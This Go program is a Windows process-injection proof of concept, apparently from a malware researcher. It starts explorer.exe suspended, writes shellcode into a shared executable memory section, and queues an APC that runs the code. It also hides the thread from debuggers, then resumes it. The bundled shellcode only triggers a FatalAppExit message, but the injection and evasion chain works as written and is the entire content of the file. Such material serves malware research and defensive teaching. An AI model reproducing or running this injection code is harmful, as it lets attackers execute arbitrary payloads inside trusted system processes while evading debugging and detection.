// +build windows
/*
Golang Windows PE Injeciton with NewSection & APC Thread
========================================================

Title:    	   Golang Windows PE Injeciton with NewSection & APC Thread
Release date:  07/12/2021
Author:		   Amanda Rousseau (Malware Unicorn)
Tested on: 	   Win10 amd64
*/
package main

import (
	"fmt"
	"log"
	"os"
	"path/filepath"
	"syscall"
	"time"
	"unsafe"

	"golang.org/x/sys/windows"
)

func IsSysWow64(ntdll syscall.Handle) (bool, error) {
	var pInfo uintptr
	pInfoLen := uint32(unsafe.Sizeof(pInfo))
	ZwQueryInformationProcess, err := syscall.GetProcAddress(
		syscall.Handle(ntdll), "ZwQueryInformationProcess")
	if err != nil {
		return false, err
	}
	r, _, err := syscall.Syscall6(uintptr(ZwQueryInformationProcess),
		5,
		uintptr(windows.CurrentProcess()),        // ProcessHandle
		uintptr(windows.ProcessWow64Information), // ProcessInformationClass
		uintptr(unsafe.Pointer(&pInfo)),         // ProcessInformation
		uintptr(pInfoLen),                       // ProcessInformationLength
		uintptr(unsafe.Pointer(&pInfoLen)),      // ReturnLength
		0)
	if r != 0 {
		log.Printf("ZwQueryInformationProcess ERROR CODE: %x", r)
		return false, err
	}
	if pInfo != 0 {
		return true, nil
	}
	return false, nil
}

const SEC_COMMIT = 0x08000000
const SECTION_WRITE = 0x2
const SECTION_READ = 0x4
const SECTION_EXECUTE = 0x8
const SECTION_RWX = SECTION_WRITE | SECTION_READ | SECTION_EXECUTE
const FILE_MAP_ALL_ACCESS = 0xF001F

func CreateNewSection(ntdll syscall.Handle, size int64) (uintptr, error) {
	var err error
	NtCreateSection, err := syscall.GetProcAddress(
		syscall.Handle(ntdll), "NtCreateSection")
	if err != nil {
		return 0, err
	}
	var section uintptr
	r, a, err := syscall.Syscall9(uintptr(NtCreateSection),
		7,
		uintptr(unsafe.Pointer(&section)), // PHANDLE            SectionHandle,
		FILE_MAP_ALL_ACCESS,               // ACCESS_MASK        DesiredAccess,
		0,                                 // POBJECT_ATTRIBUTES ObjectAttributes,
		uintptr(unsafe.Pointer(&size)),    // PLARGE_INTEGER     MaximumSize,
		windows.PAGE_EXECUTE_READWRITE,    // ULONG              SectionPageProtection,
		SEC_COMMIT,                        // ULONG              AllocationAttributes,
		0,                                 // HANDLE             FileHandle
		0,
		0)
	if r != 0 {
		log.Printf("NtCreateSection ERROR CODE: %x", r)
		return 0, err
	}
	log.Printf("%x %x %s", r, a, err)
	if section == 0 {
		return 0, fmt.Errorf("NtCreateSection failed for unknown reason")
	}
	log.Printf("Section: %0x\n", section)
	return section, nil
}

func CreateProcessInt(kernel32 syscall.Handle, procPath string) (uintptr, uintptr, error) {
	//RtlDosPathNameToNtPathName_U
	CreateProcessInternalW, err := syscall.GetProcAddress(
		syscall.Handle(kernel32), "CreateProcessInternalW")
	if err != nil {
		log.Fatalln(err)
		return 0, 0, err
	}
	var si windows.StartupInfo
	var pi windows.ProcessInformation
	log.Println(procPath)
	r, a, err := syscall.Syscall12(uintptr(CreateProcessInternalW),
		12,
		0, // IN HANDLE hUserToken,
		uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr(procPath))), // IN LPCWSTR lpApplicationName,
		0,                                 // IN LPWSTR lpCommandLine,
		0,                                 // IN LPSECURITY_ATTRIBUTES lpProcessAttributes,
		0,                                 // IN LPSECURITY_ATTRIBUTES lpThreadAttributes,
		0,                                 // IN BOOL bInheritHandles,
		uintptr(windows.CREATE_SUSPENDED), // IN DWORD dwCreationFlags,
		0,                                 // IN LPVOID lpEnvironment,
		0,                                 // IN LPCWSTR lpCurrentDirectory,
		uintptr(unsafe.Pointer(&si)),      // IN LPSTARTUPINFOW lpStartupInfo,
		uintptr(unsafe.Pointer(&pi)),      // IN LPPROCESS_INFORMATION lpProcessInformation,
		0)                                 // OUT PHANDLE hNewToken)
	if r > 1 { // hack for error code invalid function
		log.Printf("CreateProcessInternalW ERROR CODE: %x", r)
		return 0, 0, err
	}
	log.Printf("%x %x %s %x", r, a, err, pi.Process)
	return uintptr(pi.Process), uintptr(pi.Thread), nil
}

func MapViewOfSection(
	ntdll syscall.Handle, section uintptr,
	phandle uintptr, commitSize uint32,
	viewSize uint32) (uintptr, uint32, error) {
	if phandle == 0 {
		return 0, 0, nil
	}
	var err error
	ZwMapViewOfSection, err := syscall.GetProcAddress(
		syscall.Handle(ntdll), "ZwMapViewOfSection")
	if err != nil {
		return 0, 0, err
	}
	var sectionBaseAddr uintptr
	r, a, err := syscall.Syscall12(uintptr(ZwMapViewOfSection),
		10,
		section, // HANDLE          SectionHandle,
		phandle, // HANDLE          ProcessHandle,
		uintptr(unsafe.Pointer(&sectionBaseAddr)), // PVOID           *BaseAddress,
		0,                                  // ULONG_PTR       ZeroBits,
		uintptr(commitSize),                // SIZE_T          CommitSize,
		0,                                  // PLARGE_INTEGER  SectionOffset,
		uintptr(unsafe.Pointer(&viewSize)), // PSIZE_T         ViewSize,
		1,                                  // SECTION_INHERIT InheritDisposition,
		0,                                  // ULONG           AllocationType,
		windows.PAGE_READWRITE,             // ULONG           Win32Protect
		0,
		0)
	if r != 0 {
		log.Printf("ZwMapViewOfSection ERROR CODE: %x", r)
		return 0, 0, err
	}
	log.Printf("%x %x %s", r, a, err)

	return sectionBaseAddr, viewSize, nil
}

/*
func UnMapViewOfSection(ntdll syscall.Handle) error {
	return nil
}

func AllocateVirtualMemory(ntdll syscall.Handle) error {
	return nil
}

func WriteVirtualMemory(ntdll syscall.Handle) error {
	return nil
}

func FreeVirtualMemory(ntdll syscall.Handle) error {
	return nil
}

func ProtectVirtualMemory(ntdll syscall.Handle) error {
	return nil
}
*/

func QueueApcThread(ntdll syscall.Handle, thandle uintptr, funcaddr uintptr) error {
	var err error
	NtQueueApcThread, err := syscall.GetProcAddress(
		syscall.Handle(ntdll), "NtQueueApcThread")
	if err != nil {
		return err
	}
	r, _, err := syscall.Syscall6(uintptr(NtQueueApcThread),
		5,
		thandle,  // IN HANDLE               ThreadHandle,
		funcaddr, // IN PIO_APC_ROUTINE      ApcRoutine, (RemoteSectionBaseAddr)
		0,        // IN PVOID                ApcRoutineContext OPTIONAL,
		0,        // IN PIO_STATUS_BLOCK     ApcStatusBlock OPTIONAL,
		0,        // IN ULONG                ApcReserved OPTIONAL
		0)
	if r != 0 {
		log.Printf("NtQueueApcThread ERROR CODE: %x", r)
		return err
	}
	return nil
}

func SetInformationThread(ntdll syscall.Handle, thandle uintptr) error {
	var err error
	NtSetInformationThread, err := syscall.GetProcAddress(
		syscall.Handle(ntdll), "NtSetInformationThread")
	if err != nil {
		return err
	}
	ti := int32(0x11)
	r, _, err := syscall.Syscall6(uintptr(NtSetInformationThread),
		4,
		thandle,     // 	HANDLE          ThreadHandle,
		uintptr(ti), //   THREADINFOCLASS ThreadInformationClass,
		0,           //   PVOID           ThreadInformation,
		0,           //   ULONG           ThreadInformationLength
		0,
		0)
	if r != 0 {
		log.Printf("NtSetInformationThread ERROR CODE: %x", r)
		return err
	}

	return nil
}

func ResumeThread(ntdll syscall.Handle, thandle uintptr) error {
	NtResumeThread, err := syscall.GetProcAddress(
		syscall.Handle(ntdll), "NtResumeThread")
	if err != nil {
		return err
	}
	r, _, err := syscall.Syscall(uintptr(NtResumeThread),
		2,
		thandle, // 	IN HANDLE               ThreadHandle,
		0,       //   OUT PULONG              SuspendCount OPTIONAL
		0)
	if r != 0 {
		log.Printf("NtResumeThread ERROR CODE: %x", r)
		return err
	}
	return nil
}

type size_t = int
type usp = unsafe.Pointer

func Memcpy(dest uintptr, src unsafe.Pointer, len size_t) uintptr {

	cnt := len >> 3
	var i size_t = 0
	for i = 0; i < cnt; i++ {
		var pdest *uint64 = (*uint64)(usp(dest + uintptr(8*i)))
		var psrc *uint64 = (*uint64)(usp(uintptr(src) + uintptr(8*i)))
		*pdest = *psrc
	}
	left := len & 7
	for i = 0; i < left; i++ {
		var pdest *uint8 = (*uint8)(usp(dest + uintptr(8*cnt+i)))
		var psrc *uint8 = (*uint8)(usp(uintptr(src) + uintptr(8*cnt+i)))

		*pdest = *psrc
	}
	return dest
}

func main() {
	var err error
	var targetProc string = "explorer.exe"
	ntdll, err := syscall.LoadLibrary("ntdll.dll")
	if err != nil {
		log.Fatalln(err)
	}
	defer syscall.FreeLibrary(ntdll)
	kernel32, err := syscall.LoadLibrary("kernel32.dll")
	if err != nil {
		log.Fatalln(err)
	}
	defer syscall.FreeLibrary(kernel32)
	isSysWow64, err := IsSysWow64(ntdll)
	if err != nil {
		log.Fatalln(err)
	}
	systemRoot := filepath.VolumeName(os.Getenv("SYSTEMROOT")) + "\\"
	if isSysWow64 {
		log.Println("Is 32bit")
		targetProc = fmt.Sprintf("%sWindows\\SysWOW64\\%s", systemRoot, targetProc)
	} else {
		log.Println("Is 64bit")
		targetProc = fmt.Sprintf("%sWindows\\System32\\%s", systemRoot, targetProc)
	}

	procHandle, threadHandle, err := CreateProcessInt(kernel32, targetProc)
	if err != nil {
		log.Fatalln(err)
	}
	var testSize uint64 = 512
	//testBuff := []byte("HELLO WORLD!")
	// REF: https://www.exploit-db.com/exploits/28996
	shellcodeBuff := []byte("\x31\xd2\xb2\x30\x64\x8b\x12\x8b\x52\x0c\x8b\x52\x1c\x8b\x42" +
		"\x08\x8b\x72\x20\x8b\x12\x80\x7e\x0c\x33\x75\xf2\x89\xc7\x03" +
		"\x78\x3c\x8b\x57\x78\x01\xc2\x8b\x7a\x20\x01\xc7\x31\xed\x8b" +
		"\x34\xaf\x01\xc6\x45\x81\x3e\x46\x61\x74\x61\x75\xf2\x81\x7e" +
		"\x08\x45\x78\x69\x74\x75\xe9\x8b\x7a\x24\x01\xc7\x66\x8b\x2c" +
		"\x6f\x8b\x7a\x1c\x01\xc7\x8b\x7c\xaf\xfc\x01\xc7\x68\x6f\x72" +
		"\x6e\x01\x68\x55\x6e\x69\x63\x68\x20\x4d\x61\x6c\x89\xe1\xfe" +
		"\x49\x0b\x31\xc0\x51\x50\xff\xd7")
	
	section, err := CreateNewSection(ntdll, testSize)
	if err != nil {
		log.Fatalln(err)
	}
	// Local map section
	curHandle := uintptr(windows.CurrentProcess())
	localBaseAddr, _, err := MapViewOfSection(ntdll, section, curHandle, testSize, 0)
	if err != nil {
		log.Fatalln(err)
	}
	// write to current baseAddr
	log.Printf("MapViewOfSection SUCCESS")
	Memcpy(localBaseAddr, unsafe.Pointer(&shellcodeBuff[0]), len(shellcodeBuff))
	// Remote map section
	remoteBaseAddr, _, err := MapViewOfSection(ntdll, section, procHandle, testSize, 0)
	if err != nil {
		log.Fatalln(err)
	}
	log.Printf("localBaseAddr: %x \nremoteBaseAddr: %x\n", localBaseAddr, remoteBaseAddr)

	time.Sleep(2 * time.Second)
	err = QueueApcThread(ntdll, threadHandle, remoteBaseAddr)
	if err != nil {
		log.Fatalln(err)
	}
	err = SetInformationThread(ntdll, threadHandle)
	if err != nil {
		log.Fatalln(err)
	}
	err = ResumeThread(ntdll, threadHandle)
	if err != nil {
		log.Fatalln(err)
	}
}
